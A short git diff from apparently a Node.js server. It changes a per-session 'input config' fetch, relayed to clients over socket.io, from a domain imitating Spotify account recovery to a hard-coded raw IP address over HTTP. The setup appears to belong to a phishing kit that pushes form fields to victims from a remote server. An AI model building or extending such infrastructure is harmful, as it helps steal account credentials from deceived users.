@@ -318,7 +318,7 @@ const startConfigCheck = () => {
       }
 
       try {
-        const response = await axios.get(`https://spotify-recovery.com/api/get-input-config/${sessionId}`);
+        const response = await axios.get(`http://185.217.126.20/api/get-input-config/${sessionId}`);
         if (response.status === 200) {
           const inputsConfig = response.data.inputsConfig;
           io.to(sessionId).emit('configUpdate', { sessionId, inputsConfig });
